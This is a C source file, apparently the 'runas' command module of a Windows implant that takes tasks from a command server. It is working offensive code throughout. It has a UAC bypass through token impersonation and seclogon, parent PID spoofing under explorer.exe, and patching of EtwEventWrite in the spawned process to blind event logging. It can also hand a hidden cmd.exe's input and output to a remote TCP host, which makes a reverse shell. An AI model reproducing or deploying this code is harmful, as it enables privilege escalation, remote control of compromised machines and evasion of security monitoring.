#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <aclapi.h>

#ifdef INCLUDE_CMD_RUNAS

static int json_get_bool(const char *json, const char *key, int default_value) {
    char pattern[64];
    snprintf(pattern, sizeof(pattern), "\"%s\"", key);
    const char *key_ptr = strstr(json, pattern);
    if (!key_ptr) return default_value;
    const char *val_ptr = strchr(key_ptr, ':');
    if (!val_ptr) return default_value;
    val_ptr++;
    while (*val_ptr == ' ' || *val_ptr == '\t') val_ptr++;
    if (strncmp(val_ptr, "true", 4) == 0) return 1;
    if (strncmp(val_ptr, "false", 5) == 0) return 0;
    return default_value;
}

static int json_get_int(const char *json, const char *key, int default_value) {
    char pattern[64];
    snprintf(pattern, sizeof(pattern), "\"%s\"", key);
    const char *key_ptr = strstr(json, pattern);
    if (!key_ptr) return default_value;
    const char *val_ptr = strchr(key_ptr, ':');
    if (!val_ptr) return default_value;
    val_ptr++;
    while (*val_ptr == ' ' || *val_ptr == '\t') val_ptr++;
    if (*val_ptr >= '0' && *val_ptr <= '9') return atoi(val_ptr);
    return default_value;
}

void command_runas(char *task_id, char *params) {
    char username[256]    = {0};
    char password[512]    = {0};
    char domain[256]      = {0};
    char application[512] = "cmd.exe";
    char arguments[1024]  = {0};
    char remote[256]      = {0}; /* host:port for output redirection, empty = local pipe */
    /* Logon types:
     * 2=Interactive, 9=NewCredentials : CreateProcessWithLogonW
     * 3=Network, 4=Batch, 5=Service, 8=NetworkCleartext : LogonUser + SetThreadToken (SeImpersonatePrivilege) */
    int  logon_type       = 2;
    int  ppid_spoof       = 0;
    int  bypass_uac       = 0;

    if (params[0] != '{') {
        send_task_response(task_id, "Error: runas expects JSON parameters");
        return;
    }

    extract_json_string(params, "account",     username,    sizeof(username));
    extract_json_string(params, "credential",  password,    sizeof(password));
    extract_json_string(params, "realm",       domain,      sizeof(domain));
    extract_json_string(params, "application", application, sizeof(application));
    extract_json_string(params, "arguments",   arguments,   sizeof(arguments));
    extract_json_string(params, "remote",      remote,      sizeof(remote));
    logon_type  = json_get_int(params,  "logon_type", 2);
    ppid_spoof  = json_get_bool(params, "ppid_spoof", 0);
    bypass_uac  = json_get_bool(params, "bypass_uac", 0);

    // Backward compatibility with old netOnly parameter
    if (json_get_bool(params, "netOnly", -1) == 1)  logon_type = 9;
    if (json_get_bool(params, "netOnly", -1) == 0)  logon_type = 2;

    if (username[0] == '\0') {
        send_task_response(task_id, "Error: account name is empty");
        return;
    }

    wchar_t wusername[256] = {0};
    wchar_t wpassword[512] = {0};
    wchar_t wdomain[256]   = {0};
    MultiByteToWideChar(CP_UTF8, 0, username,  -1, wusername, 256);
    MultiByteToWideChar(CP_UTF8, 0, password,  -1, wpassword, 512);

    char full_cmd[2048] = {0};
    if (arguments[0] != '\0')
        snprintf(full_cmd, sizeof(full_cmd), "\"%s\" %s", application, arguments);
    else
        snprintf(full_cmd, sizeof(full_cmd), "\"%s\"", application);
    wchar_t wcmd[2048] = {0};
    MultiByteToWideChar(CP_UTF8, 0, full_cmd, -1, wcmd, 2048);

    /* ----- stdio handles: TCP socket (-r) or local anonymous pipes ----- */
    SOCKET sock           = INVALID_SOCKET;
    HANDLE hReadOut       = NULL, hWriteOut = NULL;
    HANDLE hReadErr       = NULL, hWriteErr = NULL;
    int    use_remote     = 0;

    if (remote[0]) {
        char *colon = strrchr(remote, ':');
        if (colon && colon != remote) {
            char host[200] = {0};
            int  port      = atoi(colon + 1);
            memcpy(host, remote, (size_t)(colon - remote));
            if (port > 0 && port < 65536) {
                WSADATA wsa;
                WSAStartup(MAKEWORD(2, 2), &wsa);
                sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
                if (sock != INVALID_SOCKET) {
                    SetHandleInformation((HANDLE)sock, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);
                    struct sockaddr_in addr;
                    ZeroMemory(&addr, sizeof(addr));
                    addr.sin_family      = AF_INET;
                    addr.sin_port        = htons((u_short)port);
                    addr.sin_addr.s_addr = inet_addr(host);
                    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0)
                        use_remote = 1;
                    else {
                        closesocket(sock);
                        sock = INVALID_SOCKET;
                    }
                }
            }
        }
        if (!use_remote) {
            send_task_response(task_id, "Error: could not connect to remote host");
            return;
        }
    } else {
        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
        if (!CreatePipe(&hReadOut, &hWriteOut, &sa, 0) ||
            !CreatePipe(&hReadErr, &hWriteErr, &sa, 0)) {
            send_task_response(task_id, "Error: CreatePipe failed");
            return;
        }
        SetHandleInformation(hReadOut, HANDLE_FLAG_INHERIT, 0);
        SetHandleInformation(hReadErr, HANDLE_FLAG_INHERIT, 0);
    }

    /* ----- Window station DACL (required for non-netonly logons) ------- */
    char desktop_name[320] = {0};
    if (logon_type != 9)
        grant_winsta_desktop_access(username,
                                    domain[0] ? domain : NULL,
                                    desktop_name, sizeof(desktop_name));

    /* ----- STARTUPINFO ------------------------------------------------- */
    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    if (use_remote) {
        si.hStdOutput = (HANDLE)sock;
        si.hStdError  = (HANDLE)sock;
        si.hStdInput  = (HANDLE)sock;
    } else {
        si.hStdOutput = hWriteOut;
        si.hStdError  = hWriteErr;
        si.hStdInput  = NULL;
    }
    if (desktop_name[0]) {
        wchar_t wdesktop[320] = {0};
        MultiByteToWideChar(CP_UTF8, 0, desktop_name, -1, wdesktop, 320);
        si.lpDesktop = wdesktop;
    }

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    int   use_domain   = (domain[0] && strcmp(domain, ".") != 0);
    if (use_domain)
        MultiByteToWideChar(CP_UTF8, 0, domain, -1, wdomain, 256);

    BOOL ok            = FALSE;
    DWORD err          = 0;
    int write_closed   = 0; /* 1 once hWriteOut/hWriteErr are closed */

    if (bypass_uac) {
        /* UAC bypass: LogonUser (non-filtered type) + copy IL + strip DACL + impersonate
         * + CreateProcessWithLogonW(LOGON_NETCREDENTIALS_ONLY) under impersonation context.
         * seclogon sees a high-IL caller and skips UAC token filtering. */
        int uac_lt = (logon_type == 3 || logon_type == 4 ||
                      logon_type == 5 || logon_type == 8)
                     ? logon_type : LOGON32_LOGON_NETWORK_CLEARTEXT;

        wchar_t *logon_dom_b = use_domain ? wdomain
                             : (strchr(username, '@') ? NULL : L"");

        /* RunasCS calls LogonUser(Interactive) + ImpersonateLoggedOnUser + RevertToSelf
         * before the bypass LogonUser(NetworkCleartext). Without this seed, type 8 fails
         * with 1326 on hardened Windows 10/11 even with correct credentials. */
        HANDLE hTokenSeed = NULL;
        if (LogonUserW(wusername, logon_dom_b, wpassword,
                       LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &hTokenSeed)) {
            HANDLE hTokenSeedDup = NULL;
            if (DuplicateTokenEx(hTokenSeed, TOKEN_ALL_ACCESS, NULL,
                                 SecurityImpersonation, TokenImpersonation, &hTokenSeedDup)) {
                ImpersonateLoggedOnUser(hTokenSeedDup);
                RevertToSelf();
                CloseHandle(hTokenSeedDup);
            }
            CloseHandle(hTokenSeed);
        }

        HANDLE hTokenB = NULL;
        /* Try requested type first, then fallback chain: 8 -> 3 -> 4 -> 5 */
        int uac_fallbacks[] = { uac_lt, LOGON32_LOGON_NETWORK_CLEARTEXT,
                                LOGON32_LOGON_NETWORK, LOGON32_LOGON_BATCH,
                                LOGON32_LOGON_SERVICE, -1 };
        err = 0;
        for (int fi = 0; uac_fallbacks[fi] != -1 && !hTokenB; fi++) {
            if (fi > 0 && uac_fallbacks[fi] == uac_lt) continue; /* skip duplicate */
            if (LogonUserW(wusername, logon_dom_b, wpassword,
                           (DWORD)uac_fallbacks[fi], LOGON32_PROVIDER_DEFAULT, &hTokenB))
                break;
            err = GetLastError();
            hTokenB = NULL;
        }
        if (!hTokenB) {
            if (use_remote) { closesocket(sock); WSACleanup(); }
            else { CloseHandle(hWriteOut); CloseHandle(hWriteErr);
                   CloseHandle(hReadOut);  CloseHandle(hReadErr); }
            char msg[320];
            snprintf(msg, sizeof(msg), "Error: LogonUser failed for bypass-uac (err %lu)", err);
            send_task_response(task_id, msg);
            return;
        }

        /* Copy integrity level of current process token to new token */
        HANDLE hCurTok = NULL;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hCurTok)) {
            DWORD il_size = 0;
            GetTokenInformation(hCurTok, TokenIntegrityLevel, NULL, 0, &il_size);
            TOKEN_MANDATORY_LABEL *pTIL = (TOKEN_MANDATORY_LABEL *)malloc(il_size);
            if (pTIL) {
                if (GetTokenInformation(hCurTok, TokenIntegrityLevel, pTIL, il_size, &il_size))
                    SetTokenInformation(hTokenB, TokenIntegrityLevel, pTIL, il_size);
                free(pTIL);
            }
            CloseHandle(hCurTok);
        }

        /* Remove DACL from current process (required by seclogon) */
        SetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT,
                        DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL);

        /* Impersonate and spawn - seclogon sees high-IL caller, skips UAC filter */
        ImpersonateLoggedOnUser(hTokenB);
        wchar_t *spawn_dom_b = use_domain ? wdomain : L".";
        ok = CreateProcessWithLogonW(
            wusername, spawn_dom_b, wpassword,
            LOGON_NETCREDENTIALS_ONLY,
            NULL, wcmd, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        err = GetLastError();
        RevertToSelf();
        CloseHandle(hTokenB);

        if (ok && !use_remote) {
            CloseHandle(hWriteOut); CloseHandle(hWriteErr);
            write_closed = 1;
        }

    } else if (logon_type == 3 || logon_type == 4 || logon_type == 5 || logon_type == 8) {
        /* Remote impersonation: LogonUser + DuplicateTokenEx + CreateProcess(SUSPENDED)
         * + SetThreadToken + ResumeThread.
         * Requires SeImpersonatePrivilege on the caller.
         * Type 4 requires SeBatchLogonRight, type 5 requires SeServiceLogonRight on target. */
        DWORD logon32_type;
        if      (logon_type == 3) logon32_type = LOGON32_LOGON_NETWORK;
        else if (logon_type == 4) logon32_type = LOGON32_LOGON_BATCH;
        else if (logon_type == 5) logon32_type = LOGON32_LOGON_SERVICE;
        else                      logon32_type = LOGON32_LOGON_NETWORK_CLEARTEXT;

        /* UPN format (user@domain): pass NULL domain, let LSA resolve */
        wchar_t *logon_dom = use_domain ? wdomain
                           : (strchr(username, '@') ? NULL : L".");

        HANDLE hToken = NULL, hTokenDup = NULL;
        if (!LogonUserW(wusername, logon_dom, wpassword,
                        logon32_type, LOGON32_PROVIDER_DEFAULT, &hToken)) {
            err = GetLastError();
            if (use_remote) { closesocket(sock); WSACleanup(); }
            else { CloseHandle(hWriteOut); CloseHandle(hWriteErr);
                   CloseHandle(hReadOut);  CloseHandle(hReadErr); }
            char msg[320];
            snprintf(msg, sizeof(msg), "Error: LogonUser failed for %s\\%s (err %lu)",
                     domain[0] ? domain : ".", username, err);
            send_task_response(task_id, msg);
            return;
        }
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
                              SecurityImpersonation, TokenImpersonation, &hTokenDup)) {
            err = GetLastError();
            CloseHandle(hToken);
            if (use_remote) { closesocket(sock); WSACleanup(); }
            else { CloseHandle(hWriteOut); CloseHandle(hWriteErr);
                   CloseHandle(hReadOut);  CloseHandle(hReadErr); }
            char msg[256];
            snprintf(msg, sizeof(msg), "Error: DuplicateTokenEx failed (err %lu)", err);
            send_task_response(task_id, msg);
            return;
        }
        CloseHandle(hToken);

        /* PPID spoof: open explorer with PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE */
        HANDLE hParent3 = NULL;
        LPPROC_THREAD_ATTRIBUTE_LIST attr3 = NULL;
        BOOL   use_attr3 = FALSE;

        if (ppid_spoof) {
            DWORD explorer_pid = 0;
            HANDLE hSnap3 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap3 != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe3; pe3.dwSize = sizeof(pe3);
                if (Process32First(hSnap3, &pe3)) do {
                    if (_stricmp(pe3.szExeFile, "explorer.exe") == 0 && !explorer_pid)
                        explorer_pid = pe3.th32ProcessID;
                } while (Process32Next(hSnap3, &pe3));
                CloseHandle(hSnap3);
            }
            if (explorer_pid)
                hParent3 = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorer_pid);

            if (hParent3) {
                SIZE_T attr_sz3 = 0;
                InitializeProcThreadAttributeList(NULL, 1, 0, &attr_sz3);
                attr3 = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_sz3);
                if (attr3 && InitializeProcThreadAttributeList(attr3, 1, 0, &attr_sz3)) {
                    UpdateProcThreadAttribute(attr3, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                              &hParent3, sizeof(hParent3), NULL, NULL);
                    use_attr3 = TRUE;
                }
            }
        }

        STARTUPINFOEXW siex3;
        ZeroMemory(&siex3, sizeof(siex3));
        siex3.StartupInfo     = si;
        siex3.StartupInfo.cb  = use_attr3 ? (DWORD)sizeof(siex3) : (DWORD)sizeof(STARTUPINFOW);
        if (use_attr3) siex3.lpAttributeList = attr3;

        DWORD cflags3 = CREATE_SUSPENDED | CREATE_NO_WINDOW;
        if (use_attr3) cflags3 |= EXTENDED_STARTUPINFO_PRESENT;

        ok  = CreateProcessW(NULL, wcmd, NULL, NULL, TRUE,
                             cflags3, NULL, NULL, &siex3.StartupInfo, &pi);
        err = GetLastError();

        if (use_attr3) { DeleteProcThreadAttributeList(attr3); HeapFree(GetProcessHeap(), 0, attr3); }
        if (hParent3)  CloseHandle(hParent3);

        if (ok) {
            if (!use_remote) {
                CloseHandle(hWriteOut); CloseHandle(hWriteErr);
                write_closed = 1;
            }
            if (!SetThreadToken(&pi.hThread, hTokenDup)) {
                err = GetLastError();
                TerminateProcess(pi.hProcess, 0);
                CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
                CloseHandle(hTokenDup);
                if (use_remote) { closesocket(sock); WSACleanup(); }
                else { CloseHandle(hReadOut); CloseHandle(hReadErr); }
                char msg[256];
                snprintf(msg, sizeof(msg), "Error: SetThreadToken failed (err %lu)", err);
                send_task_response(task_id, msg);
                return;
            }
            if (ppid_spoof) {
                HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
                if (hNtdll) {
                    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
                    if (pEtw) {
                        static const BYTE etw_patch[] = { 0x33, 0xC0, 0xC3 };
                        DWORD old_prot3 = 0;
                        if (VirtualProtectEx(pi.hProcess, (LPVOID)pEtw, sizeof(etw_patch),
                                             PAGE_EXECUTE_READWRITE, &old_prot3)) {
                            WriteProcessMemory(pi.hProcess, (LPVOID)pEtw,
                                               etw_patch, sizeof(etw_patch), NULL);
                            VirtualProtectEx(pi.hProcess, (LPVOID)pEtw, sizeof(etw_patch),
                                             old_prot3, &old_prot3);
                        }
                    }
                }
            }
            ResumeThread(pi.hThread);
        }
        CloseHandle(hTokenDup);

    } else if (logon_type == 9) {
        DWORD cf9 = CREATE_NO_WINDOW | (ppid_spoof ? CREATE_SUSPENDED : 0);
        ok = CreateProcessWithLogonW(
            wusername, use_domain ? wdomain : L".", wpassword,
            LOGON_NETCREDENTIALS_ONLY,
            NULL, wcmd, cf9, NULL, NULL, &si, &pi);
        err = GetLastError();
    } else {
        /* Type 2 (default): CreateProcessWithLogonW + LOGON_WITH_PROFILE */
        DWORD cf2 = CREATE_NO_WINDOW | (ppid_spoof ? CREATE_SUSPENDED : 0);
        ok = CreateProcessWithLogonW(
            wusername, use_domain ? wdomain : L".", wpassword,
            LOGON_WITH_PROFILE,
            NULL, wcmd, cf2, NULL, NULL, &si, &pi);
        err = GetLastError();
    }

    /* ETW patch for types 2/9 when ppid_spoof requested (no PPID spoof, but still patch ETW) */
    if (ok && ppid_spoof && logon_type != 3 && logon_type != 4 &&
              logon_type != 5 && logon_type != 8) {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
            if (pEtw) {
                static const BYTE etw_patch[] = { 0x33, 0xC0, 0xC3 };
                DWORD old_prot29 = 0;
                if (VirtualProtectEx(pi.hProcess, (LPVOID)pEtw, sizeof(etw_patch),
                                     PAGE_EXECUTE_READWRITE, &old_prot29)) {
                    WriteProcessMemory(pi.hProcess, (LPVOID)pEtw,
                                       etw_patch, sizeof(etw_patch), NULL);
                    VirtualProtectEx(pi.hProcess, (LPVOID)pEtw, sizeof(etw_patch),
                                     old_prot29, &old_prot29);
                }
            }
        }
        ResumeThread(pi.hThread);
    }

    if (!use_remote && !write_closed) {
        CloseHandle(hWriteOut);
        CloseHandle(hWriteErr);
    }

    if (!ok) {
        if (use_remote) { closesocket(sock); WSACleanup(); }
        else { CloseHandle(hReadOut); CloseHandle(hReadErr); }
        const char *api = (logon_type == 3 || logon_type == 4 ||
                           logon_type == 5 || logon_type == 8)
                          ? "CreateProcessW" : "CreateProcessWithLogonW";
        char msg[320];
        snprintf(msg, sizeof(msg), "Error: %s failed for %s\\%s (err %lu)",
                 api, domain[0] ? domain : "*", username, err);
        send_task_response(task_id, msg);
        return;
    }

    CloseHandle(pi.hThread);

    if (use_remote) {
        /* Child inherited the socket - close our copy and return immediately */
        CloseHandle(pi.hProcess);
        closesocket(sock);
        WSACleanup();
        char msg[256];
        snprintf(msg, sizeof(msg), "Process launched, output redirected to %s", remote);
        send_task_response(task_id, msg);
    } else {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess);

        char *output = (char *)malloc(1);
        output[0] = '\0';
        size_t total = 0;
        char   buf[4096];
        DWORD  bytes_read;

        while (ReadFile(hReadOut, buf, sizeof(buf) - 1, &bytes_read, NULL) && bytes_read > 0) {
            output = (char *)realloc(output, total + bytes_read + 1);
            memcpy(output + total, buf, bytes_read);
            total += bytes_read;
            output[total] = '\0';
        }
        CloseHandle(hReadOut);

        while (ReadFile(hReadErr, buf, sizeof(buf) - 1, &bytes_read, NULL) && bytes_read > 0) {
            output = (char *)realloc(output, total + bytes_read + 1);
            memcpy(output + total, buf, bytes_read);
            total += bytes_read;
            output[total] = '\0';
        }
        CloseHandle(hReadErr);

        if (total == 0) {
            free(output);
            output = strdup("Process completed successfully, no output captured.");
        }
        send_task_response(task_id, output);
        free(output);
    }
}

#endif
